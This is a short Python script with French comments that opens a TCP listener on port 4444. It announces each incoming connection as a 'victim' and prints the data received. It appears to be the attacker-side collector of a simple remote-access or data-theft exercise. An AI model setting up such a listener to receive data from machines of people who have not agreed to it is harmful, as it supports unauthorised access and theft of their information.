import socket

#INTEGRER L'IP DE LA MACHINE VOIR IPCONFIG
ip = "192.168.1.53"
port = 4444

sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sock.bind((ip, port))
print("Serveur hôte démarré")

while True:
    #Mise en écoute du serveur et accepter les connexions
    sock.listen(5)
    conn, address = sock.accept()
    print('Une victime vient de se connecter!')

    #Receptions de données

    donnees = conn.recv(1024)
    donnees = donnees.decode("utf8")
    print(donnees)

#Fermeture de la connexion et du socket
conn.close()
sock.close()